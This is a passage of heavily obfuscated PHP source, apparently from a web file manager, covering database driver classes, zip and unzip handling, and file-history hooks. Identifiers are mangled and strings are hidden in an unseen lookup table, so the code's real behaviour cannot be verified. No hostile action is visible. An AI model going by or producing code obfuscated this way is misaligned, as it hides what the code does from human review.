strtolower($àÌÓŸ÷Ê[$°È¦‹–ş[947]]) == $°È¦‹–ş[44] : (isset($àÌÓŸ÷Ê[$°È¦‹–ş[94]]) ? $àÌÓŸ÷Ê[$°È¦‹–ş[94]] : !1)); } } return $¹İ£«óĞ; } public function getTables($•£»óëË = '') { $ÖÈÈÚşß =& $_SERVER[­õöî’–]; if (think_config($ÖÈÈÚşß[948])) { $úİ´‹ı = str_replace($ÖÈÈÚşß[949], $•£»óëË, think_config($ÖÈÈÚşß[948])); } else { switch ($this->dbType) { case $ÖÈÈÚşß[916]: case $ÖÈÈÚşß[918]: $úİ´‹ı = $ÖÈÈÚşß[950]; break; case $ÖÈÈÚşß[915]: case $ÖÈÈÚşß[933]: $úİ´‹ı = $ÖÈÈÚşß[951]; break; case $ÖÈÈÚşß[942]: $úİ´‹ı = $ÖÈÈÚşß[952]; break; case $ÖÈÈÚşß[917]: think_exception(think_lang($ÖÈÈÚşß[953]) . $ÖÈÈÚşß[954]); break; case $ÖÈÈÚşß[934]: $úİ´‹ı = $ÖÈÈÚşß[45] . $ÖÈÈÚşß[46] . $ÖÈÈÚşß[47]; break; case $ÖÈÈÚşß[945]: default: if (!empty($•£»óëË)) { $úİ´‹ı = $ÖÈÈÚşß[896] . $•£»óëË . $ÖÈÈÚşß[897]; } else { $úİ´‹ı = $ÖÈÈÚşß[898]; } } } $¬³ŞËƒ¶ = $this->query($úİ´‹ı); $•Èş¥¡¶ = array(); foreach ($¬³ŞËƒ¶ as $”Âİçõ° => $–óùŒÕÂ) { $•Èş¥¡¶[$”Âİçõ°] = current($–óùŒÕÂ); } return $•Èş¥¡¶; } protected function parseLimit($¬ä«óÅê) { $áó®îõ =& $_SERVER[­õöî’–]; $ô½úÆÚî = $áó®îõ[12]; if (!empty($¬ä«óÅê)) { switch ($this->dbType) { case $áó®îõ[942]: case $áó®îõ[934]: $¬ä«óÅê = explode($áó®îõ[50], $¬ä«óÅê); if (count($¬ä«óÅê) > 1) { $ô½úÆÚî .= $áó®îõ[51] . $¬ä«óÅê[1] . $áó®îõ[52] . $¬ä«óÅê[0] . $áó®îõ[53]; } else { $ô½úÆÚî .= $áó®îõ[51] . $¬ä«óÅê[0] . $áó®îõ[53]; } break; case $áó®îõ[915]: case $áó®îõ[933]: break; case $áó®îõ[917]: break; case $áó®îõ[916]: case $áó®îõ[918]: break; case $áó®îõ[945]: default: $ô½úÆÚî .= $áó®îõ[51] . $¬ä«óÅê . $áó®îõ[53]; } } return $ô½úÆÚî; } public function parseKey(&$Î×ëÑ†—, $€Š’ä¾¬ = true) { $¦³²¥çÄ =& $_SERVER[­õöî’–]; if ($€Š’ä¾¬) { $Î×ëÑ†— = $this->parseKeyCheck($Î×ëÑ†—); } if ($this->dbType == $¦³²¥çÄ[945]) { if ($Î×ëÑ†— != $¦³²¥çÄ[188] && !preg_match($¦³²¥çÄ[908], $Î×ëÑ†—)) { $Î×ëÑ†— = $¦³²¥çÄ[385] . trim($Î×ëÑ†—, $¦³²¥çÄ[385]) . $¦³²¥çÄ[385]; } return $Î×ëÑ†—; } else { return parent::parseKey($Î×ëÑ†—, $€Š’ä¾¬); } } public function close() { $this->_linkID = null; } public function error() { $Øí€ú€ =& $_SERVER[­õöî’–]; if ($this->PDOStatement) { $¼Á§—Á† = $this->PDOStatement->errorInfo(); $this->error = $¼Á§—Á†[1] . $Øí€ú€[4] . $¼Á§—Á†[2]; } else { $this->error = $Øí€ú€[12]; } if ($Øí€ú€[12] != $this->queryStr) { $this->error .= LNG($Øí€ú€[48]) . $this->queryStr; } think_trace($this->error, $Øí€ú€[12], $Øí€ú€[49]); return $this->error; } public function escapeString($ì±Øº§ì) { $­½¢ŠŞ´ =& $_SERVER[­õöî’–]; switch ($this->dbType) { case $­½¢ŠŞ´[942]: case $­½¢ŠŞ´[915]: case $­½¢ŠŞ´[933]: case $­½¢ŠŞ´[945]: return addslashes($ì±Øº§ì); case $­½¢ŠŞ´[917]: case $­½¢ŠŞ´[934]: case $­½¢ŠŞ´[916]: case $­½¢ŠŞ´[918]: return str_ireplace($­½¢ŠŞ´[58], $­½¢ŠŞ´[59], $ì±Øº§ì); } } protected function parseValue($çö˜×Œ) { $±Õ¹ĞÒ„ =& $_SERVER[­õöî’–]; if (is_string($çö˜×Œ)) { $Ôô²À¯ = strpos($çö˜×Œ, $±Õ¹ĞÒ„[4]) === 0 && in_array($çö˜×Œ, array_keys($this->bind)); $çö˜×Œ = $Ôô²À¯ ? $this->escapeString($çö˜×Œ) : $±Õ¹ĞÒ„[955] . $this->escapeString($çö˜×Œ) . $±Õ¹ĞÒ„[955]; } elseif (isset($çö˜×Œ[0]) && is_string($çö˜×Œ[0]) && strtolower($çö˜×Œ[0]) == $±Õ¹ĞÒ„[297]) { $çö˜×Œ = $this->escapeString($çö˜×Œ[1]); } elseif (is_array($çö˜×Œ)) { $çö˜×Œ = array_map(array($this, $±Õ¹ĞÒ„[956]), $çö˜×Œ); } elseif (is_bool($çö˜×Œ)) { $çö˜×Œ = $çö˜×Œ ? $±Õ¹ĞÒ„[88] : $±Õ¹ĞÒ„[197]; } elseif (is_null($çö˜×Œ)) { $çö˜×Œ = $±Õ¹ĞÒ„[103]; } return $çö˜×Œ; } public function getLastInsertId() { $ö¹ğËïÖ =& $_SERVER[­õöî’–]; switch ($this->dbType) { case $ö¹ğËïÖ[942]: case $ö¹ğËïÖ[934]: case $ö¹ğËïÖ[915]: case $ö¹ğËïÖ[933]: case $ö¹ğËïÖ[917]: case $ö¹ğËïÖ[945]: return $this->_linkID->lastInsertId(); case $ö¹ğËïÖ[916]: case $ö¹ğËïÖ[918]: $ŠÒ·µ©§ = $this->table; $‰şÖ¨Òº = $this->query("\x53\x45\x4c\x45\x43\x54\x20{$ŠÒ·µ©§}\x2e\143\x75\162\x72\166\141\x6c\x20\x63\x75\162\x72\166\x61\x6c\40\106\x52\x4f\x4d\40\144\165\x61\x6c"); return $‰şÖ¨Òº ? $‰şÖ¨Òº[0][$ö¹ğËïÖ[957]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ö­ÓÄ„²) { $œ‰İéŸ =& $_SERVER[­õöî’–]; if (!CacheLock::fileLock($œ‰İéŸ[13])) { return !1; } $ùĞ„Û…­ = parent::query($ö­ÓÄ„²); CacheLock::fileUnLock($œ‰İéŸ[13]); return $ùĞ„Û…­; } public function execute($¬µ­ÒèÍ) { $Åå³ˆ¡ =& $_SERVER[­õöî’–]; if (!CacheLock::fileLock($Åå³ˆ¡[13])) { return !1; } $ÂÖ‘ÓÇ‹ = parent::execute($¬µ­ÒèÍ); CacheLock::fileUnLock($Åå³ˆ¡[13]); return $ÂÖ‘ÓÇ‹; } } class DbSqlite3 extends DbSqlite3Base { public function query($Æª…Úö) { $„×üô’ =& $_SERVER[­õöî’–]; if (!CacheLock::fileLock($„×üô’[13])) { return !1; } $«ğ“üè… = parent::query($Æª…Úö); CacheLock::fileUnLock($„×üô’[13]); return $«ğ“üè…; } public function execute($¯ÚÜöİƒ) { $„®—±¶À =& $_SERVER[­õöî’–]; if (!CacheLock::fileLock($„®—±¶À[13])) { return !1; } $Ó¿Ü¿Ñ = parent::execute($¯ÚÜöİƒ); CacheLock::fileUnLock($„®—±¶À[13]); return $Ó¿Ü¿Ñ; } } goto cêËà›”ó®; aˆ¡ÙÂ­¿—: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ç£ÄÊ¸«; if ($ç£ÄÊ¸«) { return $ç£ÄÊ¸«; } $Ñ¨…ƒæ€ = IO::init($_SERVER[­õöî’–][8]); return $Ñ¨…ƒæ€; } private static function iconvSystem($Ø’ñ”§‘) { return self::local()->iconvSystem($Ø’ñ”§‘); } private static function iconvApp($°ƒÃÚ‹) { return self::local()->iconvApp($°ƒÃÚ‹); } public static function zipFolder($—Üî£ÀË, $èË’Î—Á = "\x7a\151\160", $®¥ˆÙØ = '', $óÆ”ªÈş = REPEAT_RENAME) { $˜²½šÈ =& $_SERVER[­õöî’–]; $¬Î²öÆ = IO::listPath($—Üî£ÀË); if (!$¬Î²öÆ) { return !1; } $¬Î²öÆ = array_merge($¬Î²öÆ[$˜²½šÈ[82]], $¬Î²öÆ[$˜²½šÈ[83]]); return self::zip($¬Î²öÆ, $èË’Î—Á, $®¥ˆÙØ, $óÆ”ªÈş); } public static function zip($©£ÆãáŞ, $¤Úí±¾ = "\x7a\x69\x70", $Øˆâ—œÜ = '', $Àà…ˆî = REPEAT_RENAME) { $Ü©òÜÃ¹ =& $_SERVER[­õöî’–]; if (is_string($©£ÆãáŞ) && $©£ÆãáŞ) { $©£ÆãáŞ = array(array($Ü©òÜÃ¹[84] => $©£ÆãáŞ)); } $Ò²òÄ¿Ğ = self::init($©£ÆãáŞ[0][$Ü©òÜÃ¹[84]]); $íÍ—ú¡ö = self::info($©£ÆãáŞ[0][$Ü©òÜÃ¹[84]]); $û”Î¦› = $Ü©òÜÃ¹[12]; $×€èœ = $Ü©òÜÃ¹[12]; $ÕÔ²éèø = $Ü©òÜÃ¹[12]; if ($Øˆâ—œÜ) { $×€èœ = get_path_father($Øˆâ—œÜ); $ÕÔ²éèø = get_path_this($Øˆâ—œÜ); } else { $×€èœ = self::pathFather($íÍ—ú¡ö[$Ü©òÜÃ¹[84]]); $ÕÔ²éèø = $íÍ—ú¡ö[$Ü©òÜÃ¹[32]] . $Ü©òÜÃ¹[10] . $¤Úí±¾; if (count($©£ÆãáŞ) > 1) { $ºŸ›ñ = IO::info($×€èœ); $ÕÔ²éèø = $ºŸ›ñ[$Ü©òÜÃ¹[32]] . $Ü©òÜÃ¹[10] . $¤Úí±¾; } } if ($Ò²òÄ¿Ğ->getType() == $Ü©òÜÃ¹[106]) { $¾äŞ÷º„ = self::init($×€èœ); $æ¥¸€»® = $¾äŞ÷º„->getType() == $Ü©òÜÃ¹[106] ? $×€èœ : get_path_father($Ò²òÄ¿Ğ->path); $æ¥¸€»® = rtrim($æ¥¸€»®, $Ü©òÜÃ¹[8]) . $Ü©òÜÃ¹[8]; mk_dir($æ¥¸€»®); } else { $û”Î¦› = TEMP_FILES . $Ü©òÜÃ¹[1182] . time() . rand_string(8) . $Ü©òÜÃ¹[8]; mk_dir($û”Î¦›); file_put_contents($û”Î¦› . $Ü©òÜÃ¹[1183], $Ü©òÜÃ¹[12]); $æ¥¸€»® = $û”Î¦›; } $–²ÑşØÈ = IO::info($æ¥¸€»®); if (!$–²ÑşØÈ || !$–²ÑşØÈ[$Ü©òÜÃ¹[202]]) { show_json(LNG($Ü©òÜÃ¹[1184]), !1); } $¼Ñˆ½ÔÙ = self::zipFileList($©£ÆãáŞ, $û”Î¦›); foreach ($¼Ñˆ½ÔÙ as $·œõÆ¾Ã => $‡¨¢Ú­õ) { $¼Ñˆ½ÔÙ[$·œõÆ¾Ã] = self::iconvSystem($‡¨¢Ú­õ); } $ö”´¥ó¥ = get_filename_auto($æ¥¸€»® . $ÕÔ²éèø, $Ü©òÜÃ¹[12], $Àà…ˆî); KodArchive::create(self::iconvSystem($ö”´¥ó¥), $¼Ñˆ½ÔÙ); if (!IO::exist($ö”´¥ó¥)) { if ($û”Î¦›) { del_dir($û”Î¦›); } show_json(LNG($Ü©òÜÃ¹[1185]), !1); } if (!$û”Î¦›) { return $ö”´¥ó¥; } $ÑëÑ„¿Ø = self::move($ö”´¥ó¥, $×€èœ, $Àà…ˆî); if ($û”Î¦›) { del_dir($û”Î¦›); } if (!$ö”´¥ó¥) { show_json(LNG($Ü©òÜÃ¹[1185]), !1); } return $ÑëÑ„¿Ø; } public static function unzip($«Óù, $Ó®şùÃ¹, $†òãŞÈ = "\55\61", $Õ§šıÛ´ = "\162\x65\160\x6c\x61\x63\145") { $íÏÌòñ =& $_SERVER[­õöî’–]; $õŸÄØ›§ = parent::info($«Óù); if (!$õŸÄØ›§) { show_json(LNG($íÏÌòñ[1186]), !1); } $¡ó›ûƒá = IO::infoFull($Ó®şùÃ¹); if (!$¡ó›ûƒá) { $Ó®şùÃ¹ = IO::mkdir($Ó®şùÃ¹); } if (isset($¡ó›ûƒá[$íÏÌòñ[402]]) && trim($¡ó›ûƒá[$íÏÌòñ[84]], $íÏÌòñ[8]) != trim($Ó®şùÃ¹, $íÏÌòñ[8])) { $¢Ï÷¸Œ— = KodIO::make($¡ó›ûƒá[$íÏÌòñ[432]]); $’ŞÄéĞ— = IO::fileNameAuto($¢Ï÷¸Œ—, $¡ó›ûƒá[$íÏÌòñ[32]], REPEAT_RENAME_FOLDER, !0); $Ó®şùÃ¹ = IO::mkdir($¢Ï÷¸Œ— . $’ŞÄéĞ—); } $†òãŞÈ = $†òãŞÈ && $†òãŞÈ != $íÏÌòñ[1187] ? @json_decode($†òãŞÈ, !0) : -1; $å’İÏèË = self::unzipPart($«Óù, $†òãŞÈ); if (!$å’İÏèË || !IO::exist($å’İÏèË[$íÏÌòñ[199]])) { show_json(LNG($íÏÌòñ[105]), !1); } $È®úí¤ = $å’İÏèË[$íÏÌòñ[1188]][count($å’İÏèË[$íÏÌòñ[1188]]) - 1]; if ($È®úí¤[$íÏÌòñ[1189]] == -1 || substr($È®úí¤[$íÏÌòñ[32]], -1, 1) == $íÏÌòñ[8]) { $–•êç¶ = $å’İÏèË[$íÏÌòñ[1190]] . rand_string(10) . $íÏÌòñ[8]; mk_dir($–•êç¶); $¥­…€âˆ = count($å’İÏèË[$íÏÌòñ[1188]]) == 1 ? IO::ext($«Óù) : get_path_ext($å’İÏèË[$íÏÌòñ[199]]); $øö¥Ìë¨ = KodArchive::extract(self::iconvSystem($å’İÏèË[$íÏÌòñ[199]]), $–•êç¶, $È®úí¤[$íÏÌòñ[1189]], $’ŞÄéĞ—, $¥­…€âˆ); self::unzipErrorCheck($øö¥Ìë¨, array($íÏÌòñ[1191], $«Óù, $¥­…€âˆ, $Ó®şùÃ¹, $å’İÏèË)); Hook::trigger($íÏÌòñ[1192], $–•êç¶); recursion_dir($–•êç¶, $ôåĞãˆ, $€éš­ú×, 0); $áêã©Ï‹ = array_merge($ôåĞãˆ, $€éš­ú×); $Ò¦ªèÃ = array(); foreach ($áêã©Ï‹ as $²©ÀÀ»ô) { $ôñĞÂ¨ = IO::move(self::iconvApp($²©ÀÀ»ô), $Ó®şùÃ¹, $Õ§šıÛ´); if ($ôñĞÂ¨) { $Ò¦ªèÃ[] = $ôñĞÂ¨; } } del_dir($–•êç¶); } else { $ôñĞÂ¨ = IO::move($å’İÏèË[$íÏÌòñ[199]], $Ó®şùÃ¹, $Õ§šıÛ´, get_path_this($È®úí¤[$íÏÌòñ[32]])); if ($ôñĞÂ¨) { $Ò¦ªèÃ[] = $ôñĞÂ¨; } } return $Ò¦ªèÃ ? $Ò¦ªèÃ : !1; } public static function unzipList($à’Èˆø®) { $‹¿ÃîÖÚ =& $_SERVER[­õöî’–]; $×ÂÔûÓ = isset($à’Èˆø®[$‹¿ÃîÖÚ[1193]]) ? $à’Èˆø®[$‹¿ÃîÖÚ[1193]] : !1; $è€Èš°ğ = isset($à’Èˆø®[$‹¿ÃîÖÚ[1189]]) ? @json_decode($à’Èˆø®[$‹¿ÃîÖÚ[1189]], !0) : -1; $Õ¨ğ³— = self::unzipPart($à’Èˆø®[$‹¿ÃîÖÚ[84]], $è€Èš°ğ); if (!$Õ¨ğ³— || !IO::exist($Õ¨ğ³—[$‹¿ÃîÖÚ[199]])) { show_json(LNG($‹¿ÃîÖÚ[105]), !1); } $ˆ¦˜ŠÅ° = $Õ¨ğ³—[$‹¿ÃîÖÚ[1188]][count($Õ¨ğ³—[$‹¿ÃîÖÚ[1188]]) - 1]; $§»Ûäî  = in_array(IO::ext($Õ¨ğ³—[$‹¿ÃîÖÚ[199]]), array($‹¿ÃîÖÚ[313], $‹¿ÃîÖÚ[1194], $‹¿ÃîÖÚ[1195], $‹¿ÃîÖÚ[1196], $‹¿ÃîÖÚ[1197], $‹¿ÃîÖÚ[1198])); if (!$×ÂÔûÓ && ($ˆ¦˜ŠÅ°[$‹¿ÃîÖÚ[1189]] == -1 || $§»Ûäî )) { $ƒ ‘ˆØë = $Õ¨ğ³—[$‹¿ÃîÖÚ[1190]] . get_path_this($Õ¨ğ³—[$‹¿ÃîÖÚ[199]]) . $‹¿ÃîÖÚ[1199]; if (!IO::exist($ƒ ‘ˆØë)) { $èÄï×£ø = $ˆ¦˜ŠÅ°[$‹¿ÃîÖÚ[1189]] == -1 ? get_path_ext(IO::pathThis($à’Èˆø®[$‹¿ÃîÖÚ[84]])) : get_path_ext($Õ¨ğ³—[$‹¿ÃîÖÚ[199]]); $‹ß§¨à¡ = KodArchive::listContent(self::iconvSystem($Õ¨ğ³—[$‹¿ÃîÖÚ[199]]), !0, $èÄï×£ø); self::unzipErrorCheck($‹ß§¨à¡, array($‹¿ÃîÖÚ[1200], $à’Èˆø®, $Õ¨ğ³—)); @file_put_contents($ƒ ‘ˆØë, json_encode($‹ß§¨à¡[$‹¿ÃîÖÚ[1201]])); } return @json_decode(IO::getContent($ƒ ‘ˆØë), !0); } IO::fileOut($Õ¨ğ³—[$‹¿ÃîÖÚ[199]], $×ÂÔûÓ, get_path_this($ˆ¦˜ŠÅ°[$‹¿ÃîÖÚ[32]])); die; } private static function zipFileList($ñ©êÊî, $ºÍ‹Ö·® = false) { $š‹ë¡Ô• =& $_SERVER[­õöî’–]; $ßãîˆßõ = array(); foreach ($ñ©êÊî as $ğÄÏ˜×) { $¨ÜãÕ€ = $ğÄÏ˜×[$š‹ë¡Ô•[84]]; if ($ºÍ‹Ö·®) { $¨ÜãÕ€ = self::copy($ğÄÏ˜×[$š‹ë¡Ô•[84]], $ºÍ‹Ö·®, $š‹ë¡Ô•[809]); } else { $æê”·Ã„ = self::init($ğÄÏ˜×[$š‹ë¡Ô•[84]]); if ($æê”·Ã„->getType() == $š‹ë¡Ô•[106]) { $¨ÜãÕ€ = $æê”·Ã„->path; } } if ($¨ÜãÕ€ && self::local()->exist($¨ÜãÕ€)) { $ßãîˆßõ[$ğÄÏ˜×[$š‹ë¡Ô•[84]]] = $¨ÜãÕ€; } } if (!empty($ßãîˆßõ)) { return array_values($ßãîˆßõ); } show_json(LNG($š‹ë¡Ô•[1164]), !1); } private static function localFilePath($Éá¦İò™) { $î¨ãäôø =& $_SERVER[­õöî’–]; $„¸İÓèã = KodIO::parse($Éá¦İò™); if ($„¸İÓèã[$î¨ãäôø[33]] == KodIO::KOD_SOURCE) { $í»ÜóÏÂ = Model($î¨ãäôø[816])->fileInfoGet(KodIO::sourceID($Éá¦İò™)); if (!$í»ÜóÏÂ[$î¨ãäôø[84]]) { show_json($î¨ãäôø[1202], !1); } $Éá¦İò™ = $í»ÜóÏÂ[$î¨ãäôø[84]]; } $éÌì¬Ñ­ = self::init($Éá¦İò™); if ($éÌì¬Ñ­->pathParse[$î¨ãäôø[1149]]) { $Éá¦İò™ = $éÌì¬Ñ­->pathParse[$î¨ãäôø[1149]]; $éÌì¬Ñ­ = self::init($Éá¦İò™); } $øŸâÈÎ† = $éÌì¬Ñ­->getType(); if ($øŸâÈÎ† == $î¨ãäôø[106] || $øŸâÈÎ† == $î¨ãäôø[1203]) { if (!$éÌì¬Ñ­->exist($éÌì¬Ñ­->path)) { show_json(LNG($î¨ãäôø[105]), !1); } return $éÌì¬Ñ­->path; } return !1; } public static function unzipPart($äˆöÙ¯Ô, $ÁŞì©Ú = -1) { $ÜÛ“õÒÉ =& $_SERVER[­õöî’–]; $÷Á’ÇŒ» = IO::pathThis($äˆöÙ¯Ô); if (!$ÁŞì©Ú || $ÁŞì©Ú == -1) { $¹ì®²Ëİ = array(array($ÜÛ“õÒÉ[32] => $÷Á’ÇŒ», $ÜÛ“õÒÉ[1189] => -1)); $¹ì®²Ëİ[0][$ÜÛ“õÒÉ[1204]] = $¹ì®²Ëİ[0][$ÜÛ“õÒÉ[32]]; } else { if (is_array($ÁŞì©Ú)) { $¹ì®²Ëİ = $ÁŞì©Ú; $–ïêõº‘ = count($¹ì®²Ëİ) - 1; for ($ŸÈùüüù = 0; $ŸÈùüüù <= $–ïêõº‘; $ŸÈùüüù++) { $úì·¤¬ = $¹ì®²Ëİ[$ŸÈùüüù]; $àÈĞÒÎ = get_path_this($úì·¤¬[$ÜÛ“õÒÉ[32]]) . (checkExtSafe($úì·¤¬[$ÜÛ“õÒÉ[32]]) ? $ÜÛ“õÒÉ[12] : $ÜÛ“õÒÉ[1205]); $¹ì®²Ëİ[$ŸÈùüüù][$ÜÛ“õÒÉ[1204]] = $ÜÛ“õÒÉ[1206] . intval($úì·¤¬[$ÜÛ“õÒÉ[1189]]) . $ÜÛ“õÒÉ[386] . $àÈĞÒÎ; if ($ŸÈùüüù == 0) { continue; } $¹ì®²Ëİ[$ŸÈùüüù][$ÜÛ“õÒÉ[1204]] = $¹ì®²Ëİ[$ŸÈùüüù - 1][$ÜÛ“õÒÉ[1204]] . $ÜÛ“õÒÉ[1207] . $¹ì®²Ëİ[$ŸÈùüüù][$ÜÛ“õÒÉ[1204]]; } } } if (!is_array($¹ì®²Ëİ) || count($¹ì®²Ëİ) == 0) { return !1; } $…ƒ‚µëö = $¹ì®²Ëİ[count($¹ì®²Ëİ) - 1]; if (!IO::exist($äˆöÙ¯Ô)) { return !1; } $õ÷Ç¶“Û = TEMP_FILES . $ÜÛ“õÒÉ[1208] . kodIO::hashPathSafe($äˆöÙ¯Ô) . $ÜÛ“õÒÉ[8]; $ÁÛš»¯† = $õ÷Ç¶“Û . $…ƒ‚µëö[$ÜÛ“õÒÉ[1204]]; mk_dir($õ÷Ç¶“Û); file_put_contents(TEMP_FILES . $ÜÛ“õÒÉ[1183], $ÜÛ“õÒÉ[12]); if (IO::exist($ÁÛš»¯†)) { return array($ÜÛ“õÒÉ[199] => $ÁÛš»¯†, $ÜÛ“õÒÉ[1188] => $¹ì®²Ëİ, $ÜÛ“õÒÉ[1190] => $õ÷Ç¶“Û); } $Œšº˜¥œ = self::localFilePath($äˆöÙ¯Ô); if (!$Œšº˜¥œ) { $Œšº˜¥œ = $õ÷Ç¶“Û . $ÜÛ“õÒÉ[1209]; if (!IO::exist($Œšº˜¥œ)) { self::copy($äˆöÙ¯Ô, $õ÷Ç¶“Û, !1, get_path_this($Œšº˜¥œ)); } } if (!$Œšº˜¥œ || !IO::exist($Œšº˜¥œ)) { return !1; } if ($…ƒ‚µëö[$ÜÛ“õÒÉ[1189]] == -1) { return array($ÜÛ“õÒÉ[199] => $Œšº˜¥œ, $ÜÛ“õÒÉ[1188] => $¹ì®²Ëİ, $ÜÛ“õÒÉ[1190] => $õ÷Ç¶“Û); } $ŠÓö„Ôé = $Œšº˜¥œ; foreach ($¹ì®²Ëİ as $ŸÈùüüù => $úì·¤¬) { if (!$úì·¤¬ || $úì·¤¬[$ÜÛ“õÒÉ[1189]] == $ÜÛ“õÒÉ[1187]) { break; } if (substr($úì·¤¬[$ÜÛ“õÒÉ[32]], -1, 1) == $ÜÛ“õÒÉ[8]) { break; } $ÍúªŠ®ù = in_array(get_path_ext($úì·¤¬[$ÜÛ“õÒÉ[1204]]), array($ÜÛ“õÒÉ[313], $ÜÛ“õÒÉ[1194], $ÜÛ“õÒÉ[1195], $ÜÛ“õÒÉ[1196], $ÜÛ“õÒÉ[1197], $ÜÛ“õÒÉ[1198])); $ô–Ü¨ = $ŸÈùüüù == count($¹ì®²Ëİ) - 1 && $ÍúªŠ®ù; $ìôıÕÃî = $õ÷Ç¶“Û . $úì·¤¬[$ÜÛ“õÒÉ[1204]]; $¦ìí€‘Ñ = $õ÷Ç¶“Û . get_path_this($úì·¤¬[$ÜÛ“õÒÉ[32]]); if (IO::exist($ìôıÕÃî)) { $ŠÓö„Ôé = $ìôıÕÃî; continue; } $ŠĞä˜Ãä = $ŸÈùüüù == 0 ? get_path_ext($÷Á’ÇŒ») : get_path_ext($ŠÓö„Ôé); $ÆûËÕ° = KodArchive::extract(self::iconvSystem($ŠÓö„Ôé), $õ÷Ç¶“Û, $úì·¤¬[$ÜÛ“õÒÉ[1189]], $»ÑÄˆúß, $ŠĞä˜Ãä); self::unzipErrorCheck($ÆûËÕ°, array($ÜÛ“õÒÉ[1210], $äˆöÙ¯Ô, $¹ì®²Ëİ, $úì·¤¬, $ìôıÕÃî)); if (IO::exist($¦ìí€‘Ñ)) { IO::rename($¦ìí€‘Ñ, get_path_this($ìôıÕÃî)); } $ŠÓö„Ôé = $ìôıÕÃî; } $ÁÛš»¯† = $ŠÓö„Ôé; return array($ÜÛ“õÒÉ[199] => $ŠÓö„Ôé, $ÜÛ“õÒÉ[1188] => $¹ì®²Ëİ, $ÜÛ“õÒÉ[1190] => $õ÷Ç¶“Û); } private static function unzipErrorCheck($«ú©çé“, $êàıÒ³ê = false) { $ççÒ€Óä =& $_SERVER[­õöî’–]; if ($«ú©çé“[$ççÒ€Óä[1211]]) { return !0; } write_log(array($ççÒ€Óä[1212], $«ú©çé“, $êàıÒ³ê), $ççÒ€Óä[1213]); show_json($ççÒ€Óä[1214] . json_encode($«ú©çé“[$ççÒ€Óä[1201]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $»¬åÅ¨© =& $_SERVER[­õöî’–]; $´Úã¶–» = $GLOBALS[$»¬åÅ¨©[6]][$»¬åÅ¨©[89]]; if ($´Úã¶–»[$»¬åÅ¨©[1215]] != 1) { return; } if ($´Úã¶–»[$»¬åÅ¨©[1216]] <= 0) { return; } if (isset($_REQUEST[$»¬åÅ¨©[1217]]) && $_REQUEST[$»¬åÅ¨©[1217]] == $»¬åÅ¨©[88]) { return; } Hook::bind($»¬åÅ¨©[1218], $»¬åÅ¨©[1219]); Hook::bind($»¬åÅ¨©[1220], $»¬åÅ¨©[1221]); Hook::bind($»¬åÅ¨©[1222], $»¬åÅ¨©[1223]); Hook::bind($»¬åÅ¨©[1224], $»¬åÅ¨©[1225]); Hook::bind($»¬åÅ¨©[1226], $»¬åÅ¨©[1227]); Hook::bind($»¬åÅ¨©[1228], $»¬åÅ¨©[1229]); } public static function eventBeforeUpload($Éˆ°¿å) { if ($Éˆ°¿å[3] && $Éˆ°¿å[3] != REPEAT_REPLACE) { return; } $…¢âã™ê = self::parsePath($Éˆ°¿å[0]); if (!$…¢âã™ê) { return; } self::add($…¢âã™ê); } public static function eventBeforeEdit($ÃÂÇãÏ) { $¿ÄˆÀ•¡ = self::parsePath($ÃÂÇãÏ[0]); if (!$¿ÄˆÀ•¡) { return; } self::add($¿ÄˆÀ•¡); } public static function eventBeforeCopyFile($ëÚõèâõ, $£­Ü‚º¬, $Òç™†Ï, $©è‡ŒÏ, $–«¤ô¶, $ıİÏÙ¿) { $¢ö»àĞ± =& $_SERVER[­õöî’–]; if (isset($Òç™†Ï->_data[$¢ö»àĞ±[1153]]) && $Òç™†Ï->_data[$¢ö»àĞ±[1153]]) { return; } $ëÖÍî¬ = $Òç™†Ï->getPathOuter($©è‡ŒÏ); $»ëÜé¥Ô = self::parsePath($ëÖÍî¬); if (!$»ëÜé¥Ô) { return; } self::add($»ëÜé¥Ô); } public static function eventBeforeRename($Ìç‹ı ) { $šöÂ×Ø =& $_SERVER[­õöî’–]; $Ÿ›”Êßç = self::parsePath($Ìç‹ı [0]); if (!$Ÿ›”Êßç) { return; } $®¢É×À = self::checkInHistory($Ÿ›”Êßç); if (!$®¢É×À) { return; } if ($®¢É×À[$šöÂ×Ø[33]] == $šöÂ×Ø[199]) { $Ö¾”ØíÉ = self::listData($Ÿ›”Êßç); if ($Ö¾”ØíÉ && $Ö¾”ØíÉ[$šöÂ×Ø[369]]) { self::moveHistory($Ÿ›”Êßç, $Ìç‹ı [1]); } } else { IO::rename($®¢É×À[$šöÂ×Ø[84]], $Ìç‹ı [1]); } } public static function eventBeforeMove($¨›ûş•ã) { $£ˆıÀ‰ =& $_SERVER[­õöî’–]; $¬”®ÂÃ = self::parsePath($¨›ûş•ã[0]); if (!$¬”®ÂÃ) { return; } $ë¬¾ÁŸ‰ = self::parsePath($¨›ûş•ã[1]); if (!$ë¬¾ÁŸ‰) { return; } $Ò¿î²¨¥ = $¨›ûş•ã[3]; $Ëµó£›­ = self::checkInHistory($¬”®ÂÃ); if (!$Ëµó£›­) { return; } $æàâª” = self::pathHistory($ë¬¾ÁŸ‰); if ($Ëµó£›­[$£ˆıÀ‰[33]] == $£ˆıÀ‰[199]) { $§«±àõ¬ = self::listData($¬”®ÂÃ); $˜­…İ‚¸ = rtrim($ë¬¾ÁŸ‰, $£ˆıÀ‰[8]) . $£ˆıÀ‰[8] . ($Ò¿î²¨¥ ? $Ò¿î²¨¥ : get_path_this($¬”®ÂÃ)); $ÔÏ½çîş = self::listData($˜­…İ‚¸); if ($§«±àõ¬ && $§«±àõ¬[$£ˆıÀ‰[369]] && $ÔÏ½çîş && $ÔÏ½çîş[$£ˆıÀ‰[369]]) { return self::clear($¬”®ÂÃ); } if ($§«±àõ¬ && $§«±àõ¬[$£ˆıÀ‰[369]]) { self::moveHistory($¬”®ÂÃ, $Ò¿î²¨¥, $æàâª”); } } else { IO::move($Ëµó£›­[$£ˆıÀ‰[84]], $æàâª”, !1, $Ò¿î²¨¥); self::clearEmptyFolder(IO::pathFather($Ëµó£›­[$£ˆıÀ‰[84]])); } } public static function eventAfterRemove($ÁıÓ‘ù, $È±°¿Ê) { $·ˆëà” =& $_SERVER[­õöî’–]; if (!$È±°¿Ê) { return; } $èÜíÂ¡ = self::parsePath($ÁıÓ‘ù[0]); if (!$èÜíÂ¡) { return; } $Â­šœÛ = self::checkInHistory($èÜíÂ¡); if (!$Â­šœÛ) { return; } if ($Â­šœÛ[$·ˆëà”[33]] == $·ˆëà”[199]) { $ğ©­”×Ä = self::listData($èÜíÂ¡, !1); if 